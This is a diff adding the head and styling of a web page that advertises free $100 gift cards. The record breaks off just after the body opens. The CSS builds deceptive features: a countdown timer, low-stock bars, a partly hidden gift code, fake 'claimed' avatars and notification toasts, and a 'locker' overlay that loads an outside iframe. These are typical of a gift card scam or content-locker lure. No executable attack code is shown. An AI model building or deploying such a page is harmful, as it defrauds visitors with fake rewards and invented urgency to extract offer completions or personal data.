@@ -1,0 +1,1791 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🎁 FREE $100 Gift Cards – Limited Time!</title>
+    <meta name="description" content="Claim your FREE $100 gift card today. Limited stock available!">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-gold: #FFD700;
+            --secondary-gold: #FFA500;
+            --accent-orange: #FF6B35;
+            --success-green: #00C853;
+            --danger-red: #FF3D3D;
+            --bg-dark: #06061a;
+            --bg-card: rgba(255,255,255,0.04);
+            --glass-border: rgba(255,255,255,0.08);
+            --text-primary: #ffffff;
+            --text-secondary: #9ca3af;
+            --text-muted: #6b7280;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-dark);
+            min-height: 100vh;
+            overflow-x: hidden;
+            color: var(--text-primary);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* ========== ANIMATED BACKGROUND ========== */
+        .bg-effects {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .bg-orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.15;
+            animation: orbFloat 20s ease-in-out infinite;
+        }
+
+        .bg-orb:nth-child(1) {
+            width: 600px; height: 600px;
+            background: radial-gradient(circle, #7c3aed, transparent);
+            top: -200px; left: -200px;
+            animation-duration: 25s;
+        }
+
+        .bg-orb:nth-child(2) {
+            width: 500px; height: 500px;
+            background: radial-gradient(circle, #2563eb, transparent);
+            bottom: -150px; right: -150px;
+            animation-duration: 30s; animation-delay: -5s;
+        }
+
+        .bg-orb:nth-child(3) {
+            width: 400px; height: 400px;
+            background: radial-gradient(circle, #FFD700, transparent);
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            animation-duration: 20s; animation-delay: -10s;
+            opacity: 0.07;
+        }
+
+        .bg-orb:nth-child(4) {
+            width: 300px; height: 300px;
+            background: radial-gradient(circle, #ec4899, transparent);
+            top: 30%; right: -100px;
+            animation-duration: 22s; animation-delay: -3s;
+            opacity: 0.1;
+        }
+
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(30px, -40px) scale(1.1); }
+            50% { transform: translate(-20px, 20px) scale(0.9); }
+            75% { transform: translate(40px, 30px) scale(1.05); }
+        }
+
+        .bg-grid {
+            position: absolute;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-size: 60px 60px;
+            mask-image: radial-gradient(ellipse at center, black 30%, transparent 80%);
+            -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 80%);
+        }
+
+        .particles-container {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .floating-particle {
+            position: absolute;
+            border-radius: 50%;
+            animation: particleRise linear infinite;
+            opacity: 0;
+        }
+
+        @keyframes particleRise {
+            0% { transform: translateY(100vh) translateX(0) scale(0); opacity: 0; }
+            5% { opacity: 0.6; }
+            50% { transform: translateY(50vh) translateX(30px) scale(1); opacity: 0.4; }
+            95% { opacity: 0; }
+            100% { transform: translateY(-10vh) translateX(-20px) scale(0.5); opacity: 0; }
+        }
+
+        /* ========== MAIN CONTENT ========== */
+        .main-wrapper {
+            position: relative;
+            z-index: 2;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        /* ========== HEADER ========== */
+        .hero-section {
+            text-align: center;
+            padding: 50px 0 30px;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, rgba(255,215,0,0.15), rgba(255,107,53,0.1));
+            border: 1px solid rgba(255,215,0,0.25);
+            padding: 8px 20px;
+            border-radius: 100px;
+            font-size: 0.8em;
+            font-weight: 600;
+            color: var(--primary-gold);
+            margin-bottom: 20px;
+            animation: badgePulse 3s ease-in-out infinite;
+        }
+
+        @keyframes badgePulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255,215,0,0.2); }
+            50% { box-shadow: 0 0 20px 5px rgba(255,215,0,0.1); }
+        }
+
+        .hero-badge .live-dot {
+            width: 8px; height: 8px;
+            background: var(--success-green);
+            border-radius: 50%;
+            animation: livePulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes livePulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(0.8); }
+        }
+
+        .hero-title {
+            font-size: clamp(2em, 6vw, 3.5em);
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 16px;
+            letter-spacing: -0.02em;
+        }
+
+        .hero-title .gradient-text {
+            background: linear-gradient(135deg, #FFD700 0%, #FF8C00 25%, #FF6B35 50%, #FFD700 75%, #FF8C00 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: textShine 4s linear infinite;
+        }
+
+        @keyframes textShine {
+            to { background-position: 200% center; }
+        }
+
+        .hero-subtitle {
+            font-size: clamp(0.9em, 2.5vw, 1.15em);
+            color: var(--text-secondary);
+            max-width: 550px;
+            margin: 0 auto;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+
+        /* ========== STATS BAR ========== */
+        .stats-bar {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin: 25px 0;
+        }
+
+        .stat-chip {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--bg-card);
+            border: 1px solid var(--glass-border);
+            padding: 8px 16px;
+            border-radius: 100px;
+            font-size: 0.8em;
+            font-weight: 500;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        .stat-chip i { font-size: 0.85em; }
+        .stat-chip .green { color: var(--success-green); }
+        .stat-chip .gold { color: var(--primary-gold); }
+        .stat-chip .blue { color: #60a5fa; }
+
+        /* ========== TIMER ========== */
+        .timer-section {
+            background: linear-gradient(135deg, rgba(255,61,61,0.08), rgba(255,61,61,0.03));
+            border: 1px solid rgba(255,61,61,0.15);
+            border-radius: 20px;
+            padding: 24px;
+            max-width: 600px;
+            margin: 0 auto 30px;
+            text-align: center;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .timer-section::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,61,61,0.05), transparent);
+            animation: timerSweep 4s ease-in-out infinite;
+        }
+
+        @keyframes timerSweep {
+            0% { left: -100%; }
+            100% { left: 200%; }
+        }
+
+        .timer-label {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 0.85em;
+            font-weight: 700;
+            color: var(--danger-red);
+            margin-bottom: 16px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .timer-label i {
+            animation: timerIcon 1s ease-in-out infinite;
+        }
+
+        @keyframes timerIcon {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+
+        .countdown-grid {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .countdown-block {
+            background: rgba(255,61,61,0.08);
+            border: 1px solid rgba(255,61,61,0.2);
+            border-radius: 16px;
+            padding: 12px 0;
+            min-width: 72px;
+        }
+
+        .countdown-block .cd-number {
+            font-size: 2em;
+            font-weight: 900;
+            color: var(--danger-red);
+            line-height: 1;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .countdown-block .cd-label {
+            font-size: 0.65em;
+            color: rgba(255,61,61,0.6);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 4px;
+            font-weight: 600;
+        }
+
+        .countdown-separator {
+            display: flex;
+            align-items: center;
+            font-size: 1.8em;
+            font-weight: 800;
+            color: rgba(255,61,61,0.3);
+            animation: colonBlink 1s step-end infinite;
+        }
+
+        @keyframes colonBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        /* ========== GIFT CARD GRID ========== */
+        .grid-section { padding: 10px 0 50px; }
+
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        /* ========== GIFT CARD BOX ========== */
+        .gc-box {
+            position: relative;
+            border-radius: 24px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1), box-shadow 0.5s ease;
+            will-change: transform;
+        }
+
+        .gc-box:active { transform: scale(0.97) !important; }
+
+        .gc-border-glow {
+            position: absolute;
+            inset: 0;
+            border-radius: 24px;
+            padding: 1px;
+            background: linear-gradient(135deg, rgba(255,215,0,0.3), rgba(139,92,246,0.2), rgba(59,130,246,0.2), rgba(255,215,0,0.3));
+            background-size: 300% 300%;
+            animation: borderRotate 6s ease infinite;
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            opacity: 0.5;
+            transition: opacity 0.4s ease;
+        }
+
+        .gc-box:hover .gc-border-glow { opacity: 1; }
+
+        @keyframes borderRotate {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .gc-inner {
+            position: relative;
+            background: linear-gradient(165deg, rgba(15,15,45,0.9), rgba(8,8,30,0.95));
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 28px 24px;
+            text-align: center;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            overflow: hidden;
+        }
+
+        .gc-shine {
+            position: absolute;
+            top: 0; left: -150%;
+            width: 80%; height: 100%;
+            background: linear-gradient(105deg, transparent 40%, rgba(255,255,255,0.03) 45%, rgba(255,255,255,0.06) 50%, rgba(255,255,255,0.03) 55%, transparent 60%);
+            transform: skewX(-25deg);
+            animation: shinePass 5s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes shinePass {
+            0% { left: -150%; }
+            100% { left: 250%; }
+        }
+
+        .gc-glow-dot {
+            position: absolute;
+            top: 20px; right: 20px;
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            background: var(--success-green);
+            box-shadow: 0 0 10px var(--success-green), 0 0 20px rgba(0,200,83,0.3);
+            animation: livePulse 2s ease-in-out infinite;
+        }
+
+        /* ========== OFFICIAL LOGO STYLES ========== */
+        .gc-logo-wrapper {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 16px;
+            position: relative;
+        }
+
+        .gc-logo-bg {
+            position: absolute;
+            inset: -6px;
+            border-radius: 26px;
+            opacity: 0.4;
+            animation: logoPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes logoPulse {
+            0%, 100% { transform: scale(1); opacity: 0.3; }
+            50% { transform: scale(1.1); opacity: 0.6; }
+        }
+
+        .gc-logo {
+            width: 90px;
+            height: 90px;
+            border-radius: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            position: relative;
+            z-index: 1;
+            overflow: hidden;
+            border: 2px solid rgba(255,255,255,0.08);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .gc-box:hover .gc-logo {
+            transform: scale(1.05);
+            box-shadow: 0 12px 40px rgba(0,0,0,0.4);
+        }
+
+        .gc-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        /* Fallback icon styling */
+        .gc-logo .logo-fallback {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.2em;
+            font-weight: 900;
+            border-radius: 20px;
+        }
+
+        .gc-name {
+            font-size: 1.15em;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .gc-type {
+            font-size: 0.78em;
+            color: var(--text-muted);
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .gc-amount {
+            font-size: 2.5em;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--primary-gold), var(--accent-orange));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 6px;
+            line-height: 1;
+        }
+
+        .gc-free-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: linear-gradient(135deg, rgba(0,200,83,0.15), rgba(0,230,118,0.08));
+            border: 1px solid rgba(0,200,83,0.3);
+            color: var(--success-green);
+            padding: 5px 16px;
+            border-radius: 100px;
+            font-size: 0.72em;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 16px;
+        }
+
+        .gc-stock-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+
+        .gc-stock-indicator {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .stock-pulse {
+            width: 7px; height: 7px;
+            border-radius: 50%;
+            animation: livePulse 1.5s ease-in-out infinite;
+        }
+
+        .stock-pulse.low { background: var(--danger-red); box-shadow: 0 0 8px rgba(255,61,61,0.5); }
+        .stock-pulse.medium { background: var(--secondary-gold); box-shadow: 0 0 8px rgba(255,165,0,0.5); }
+        .stock-pulse.high { background: var(--success-green); box-shadow: 0 0 8px rgba(0,200,83,0.5); }
+
+        .stock-label { font-size: 0.78em; font-weight: 600; }
+        .stock-label.low { color: var(--danger-red); }
+        .stock-label.medium { color: var(--secondary-gold); }
+        .stock-label.high { color: var(--success-green); }
+
+        .gc-progress {
+            width: 100%; height: 4px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 18px;
+        }
+
+        .gc-progress-fill {
+            height: 100%;
+            border-radius: 10px;
+            transition: width 1s ease;
+        }
+
+        .gc-progress-fill.low {
+            background: linear-gradient(90deg, var(--danger-red), #ff6b6b);
+            animation: progressGlow 2s ease-in-out infinite;
+        }
+
+        .gc-progress-fill.medium { background: linear-gradient(90deg, var(--secondary-gold), #ffd700); }
+        .gc-progress-fill.high { background: linear-gradient(90deg, var(--success-green), #69f0ae); }
+
+        @keyframes progressGlow {
+            0%, 100% { box-shadow: 0 0 10px rgba(255,61,61,0.5); }
+            50% { box-shadow: 0 0 20px rgba(255,61,61,0.8); }
+        }
+
+        .gc-claim-btn {
+            width: 100%;
+            padding: 14px 24px;
+            border: none;
+            border-radius: 14px;
+            font-size: 0.95em;
+            font-weight: 800;
+            font-family: inherit;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            background: linear-gradient(135deg, var(--primary-gold), var(--secondary-gold), var(--accent-orange));
+            background-size: 200% 200%;
+            animation: btnShimmer 3s ease infinite;
+            color: #000;
+            box-shadow: 0 4px 20px rgba(255,215,0,0.25);
+            transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        @keyframes btnShimmer {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .gc-claim-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: linear-gradient(transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(45deg);
+            animation: btnShine 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes btnShine {
+            0% { transform: rotate(45deg) translateY(-120%); }
+            100% { transform: rotate(45deg) translateY(120%); }
+        }
+
+        .gc-claim-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(255,215,0,0.4);
+        }
+
+        .gc-box:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3), 0 0 30px rgba(255,215,0,0.05);
+        }
+
+        /* ========== MODAL ========== */
+        .modal-backdrop {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+        }
+
+        .modal-backdrop.open {
+            display: flex;
+            animation: modalFadeIn 0.3s ease;
+        }
+
+        @keyframes modalFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-box {
+            width: 100%;
+            max-width: 460px;
+            max-height: 90vh;
+            overflow-y: auto;
+            background: linear-gradient(170deg, #141438, #0a0a28, #0d0d30);
+            border: 1px solid rgba(255,215,0,0.15);
+            border-radius: 28px;
+            padding: 36px 28px;
+            text-align: center;
+            position: relative;
+            animation: modalSlideUp 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            box-shadow: 0 25px 80px rgba(0,0,0,0.5), 0 0 60px rgba(255,215,0,0.05), inset 0 1px 0 rgba(255,255,255,0.05);
+        }
+
+        .modal-box::-webkit-scrollbar { width: 4px; }
+        .modal-box::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
+
+        @keyframes modalSlideUp {
+            from { opacity: 0; transform: translateY(40px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .modal-close-btn {
+            position: absolute;
+            top: 16px; right: 16px;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: var(--text-secondary);
+            width: 36px; height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: all 0.3s;
+            z-index: 5;
+        }
+
+        .modal-close-btn:hover {
+            background: rgba(255,61,61,0.15);
+            color: var(--danger-red);
+            border-color: rgba(255,61,61,0.3);
+        }
+
+        .modal-icon-wrap {
+            width: 88px; height: 88px;
+            margin: 0 auto 18px;
+            position: relative;
+        }
+
+        .modal-icon-ring {
+            position: absolute;
+            inset: -8px;
+            border-radius: 28px;
+            border: 2px solid rgba(255,215,0,0.2);
+            animation: ringPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes ringPulse {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.08); opacity: 1; }
+        }
+
+        .modal-icon-box {
+            width: 88px; height: 88px;
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            position: relative;
+            z-index: 1;
+            overflow: hidden;
+            border: 2px solid rgba(255,255,255,0.08);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+
+        .modal-icon-box img {
+            width: 100%; height: 100%;
+            object-fit: cover;
+        }
+
+        .modal-card-title {
+            font-size: 1.5em;
+            font-weight: 800;
+            margin-bottom: 4px;
+        }
+
+        .modal-card-amount {
+            font-size: 2.8em;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--success-green), #69f0ae);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.2;
+            margin-bottom: 4px;
+        }
+
+        .modal-card-subtitle {
+            font-size: 0.8em;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+        }
+
+        .code-card {
+            background: rgba(0,0,0,0.35);
+            border: 1.5px dashed rgba(255,215,0,0.3);
+            border-radius: 18px;
+            padding: 22px 18px;
+            margin: 0 0 20px;
+            position: relative;
+        }
+
+        .code-card-label {
+            font-size: 0.7em;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .code-card-value {
+            font-family: 'Courier New', 'SF Mono', monospace;
+            font-size: clamp(1.1em, 4vw, 1.6em);
+            font-weight: 800;
+            letter-spacing: 2px;
+            word-break: break-all;
+            line-height: 1.4;
+        }
+
+        .code-hidden { color: #333; }
+        .code-visible { color: var(--primary-gold); }
+        .code-separator { color: #333; }
+
+        .code-lock-overlay {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+        }
+
+        .code-lock-overlay i {
+            font-size: 2em;
+            color: rgba(255,215,0,0.12);
+        }
+
+        .modal-progress { margin-bottom: 18px; }
+
+        .modal-progress-bar {
+            width: 100%; height: 6px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .modal-progress-fill {
+            width: 87%; height: 100%;
+            background: linear-gradient(90deg, var(--primary-gold), var(--accent-orange));
+            border-radius: 10px;
+            position: relative;
+        }
+
+        .modal-progress-fill::after {
+            content: '';
+            position: absolute;
+            right: 0; top: 0;
+            width: 20px; height: 100%;
+            background: rgba(255,255,255,0.4);
+            border-radius: 10px;
+            animation: progressPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes progressPulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.8; }
+        }
+
+        .modal-progress-text {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 0.75em;
+            color: var(--primary-gold);
+            margin-top: 8px;
+            font-weight: 600;
+        }
+
+        .modal-claimed-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .avatar-group { display: flex; }
+
+        .avatar-circle {
+            width: 30px; height: 30px;
+            border-radius: 50%;
+            border: 2px solid #141438;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.55em;
+            font-weight: 700;
+            color: #000;
+            margin-left: -7px;
+        }
+
+        .avatar-circle:first-child { margin-left: 0; background: linear-gradient(135deg, #FFD700, #FFA500); }
+        .avatar-circle:nth-child(2) { background: linear-gradient(135deg, #60a5fa, #3b82f6); }
+        .avatar-circle:nth-child(3) { background: linear-gradient(135deg, #34d399, #10b981); }
+        .avatar-circle:nth-child(4) { background: linear-gradient(135deg, #a78bfa, #8b5cf6); }
+        .avatar-circle:nth-child(5) { background: rgba(255,255,255,0.1); color: #fff; border-color: rgba(255,255,255,0.2); }
+
+        .claimed-count-text {
+            font-size: 0.78em;
+            color: var(--success-green);
+            font-weight: 600;
+        }
+
+        .unlock-action-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 16px;
+            font-size: 1.05em;
+            font-weight: 800;
+            font-family: inherit;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            background: linear-gradient(135deg, var(--success-green), #00E676, #69F0AE);
+            background-size: 200% 200%;
+            animation: btnShimmer 3s ease infinite;
+            color: #000;
+            box-shadow: 0 6px 25px rgba(0,200,83,0.3);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .unlock-action-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: linear-gradient(transparent, rgba(255,255,255,0.15), transparent);
+            transform: rotate(45deg);
+            animation: btnShine 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        .unlock-action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 35px rgba(0,200,83,0.45);
+        }
+
+        .unlock-action-btn:active { transform: scale(0.97); }
+
+        .error-msg {
+            color: var(--danger-red);
+            font-weight: 700;
+            font-size: 0.88em;
+            margin-top: 14px;
+            display: none;
+            padding: 10px;
+            background: rgba(255,61,61,0.08);
+            border: 1px solid rgba(255,61,61,0.2);
+            border-radius: 12px;
+        }
+
+        .error-msg.visible {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            animation: shakeError 0.5s ease;
+        }
+
+        @keyframes shakeError {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-8px); }
+            40% { transform: translateX(8px); }
+            60% { transform: translateX(-5px); }
+            80% { transform: translateX(5px); }
+        }
+
+        .modal-fine-print {
+            font-size: 0.72em;
+            color: var(--text-muted);
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+
+        .modal-fine-print i { color: var(--primary-gold); }
+
+        /* ========== LOCKER OVERLAY ========== */
+        .locker-backdrop {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.92);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+        }
+
+        .locker-backdrop.open {
+            display: flex;
+            animation: modalFadeIn 0.3s ease;
+        }
+
+        .locker-frame-wrap {
+            width: 100%;
+            max-width: 550px;
+            height: 85vh;
+            background: #fff;
+            border-radius: 24px;
+            overflow: hidden;
+            position: relative;
+            animation: modalSlideUp 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            box-shadow: 0 30px 90px rgba(0,0,0,0.6);
+        }
+
+        .locker-close-btn {
+            position: absolute;
+            top: 12px; right: 12px;
+            background: rgba(0,0,0,0.75);
+            color: #fff;
+            border: none;
+            width: 38px; height: 38px;
+            border-radius: 50%;
+            font-size: 1.2em;
+            cursor: pointer;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        .locker-close-btn:hover { background: var(--danger-red); }
+
+        .locker-frame-wrap iframe {
+            width: 100%; height: 100%;
+            border: none;
+        }
+
+        /* ========== NOTIFICATION TOASTS ========== */
+        .toast-stack {
+            position: fixed;
+            bottom: 20px;
+            left: 16px;
+            z-index: 900;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-width: 370px;
+            width: calc(100% - 32px);
+        }
+
+        .toast-item {
+            background: linear-gradient(135deg, rgba(15,15,50,0.97), rgba(10,10,35,0.98));
+            border: 1px solid rgba(0,200,83,0.2);
+            border-left: 3px solid var(--success-green);
+            border-radius: 14px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+            animation: toastIn 0.5s cubic-bezier(0.23, 1, 0.32, 1), toastOut 0.5s ease 8.5s forwards;
+        }
+
+        @keyframes toastIn {
+            from { opacity: 0; transform: translateX(-40px) scale(0.95); }
+            to { opacity: 1; transform: translateX(0) scale(1); }
+        }
+
+        @keyframes toastOut {
+            to { opacity: 0; transform: translateX(-40px) scale(0.95); }
+        }
+
+        .toast-check {
+            width: 36px; height: 36px;
+            background: rgba(0,200,83,0.12);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 0.9em;
+            color: var(--success-green);
+        }
+
+        .toast-body { flex: 1; min-width: 0; }
+
+        .toast-body p {
+            font-size: 0.82em;
+            color: #d1d5db;
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        .toast-body strong { color: var(--primary-gold); }
+        .toast-body .toast-brand { color: #60a5fa; font-weight: 600; }
+
+        .toast-time {
+            font-size: 0.65em;
+            color: var(--text-muted);
+            flex-shrink: 0;
+        }
+
+        /* ========== FOOTER ========== */
+        .page-footer {
+            text-align: center;
+            padding: 40px 20px 30px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .footer-text {
+            font-size: 0.72em;
+            color: var(--text-muted);
+            max-width: 500px;
+            margin: 0 auto;
+            line-height: 1.7;
+        }
+
+        /* ========== MOBILE ========== */
+        @media (max-width: 768px) {
+            .main-wrapper { padding: 0 12px; }
+            .hero-section { padding: 35px 0 20px; }
+            .card-grid { grid-template-columns: 1fr; gap: 16px; }
+            .gc-inner { padding: 24px 20px; }
+            .countdown-block { min-width: 60px; padding: 10px 0; }
+            .countdown-block .cd-number { font-size: 1.6em; }
+            .timer-section { padding: 20px 16px; margin-bottom: 20px; }
+            .modal-box { padding: 28px 20px; border-radius: 24px; }
+            .toast-stack { max-width: 310px; bottom: 12px; left: 12px; }
+            .toast-item { padding: 10px 12px; }
+            .stats-bar { gap: 8px; }
+            .stat-chip { padding: 6px 12px; font-size: 0.72em; }
+            .gc-logo-wrapper { width: 80px; height: 80px; }
+            .gc-logo { width: 80px; height: 80px; }
+        }
+
+        @media (max-width: 380px) {
+            .hero-title { font-size: 1.8em; }
+            .countdown-block { min-width: 52px; }
+            .countdown-block .cd-number { font-size: 1.4em; }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+
+        @media (hover: none) {
+            .gc-box:hover { transform: none; box-shadow: none; }
+            .gc-claim-btn:hover { transform: none; box-shadow: 0 4px 20px rgba(255,215,0,0.25); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-effects">
+        <div class="bg-orb"></div>
+        <div class="bg-orb"></div>
+        <div class="bg-orb"></div>
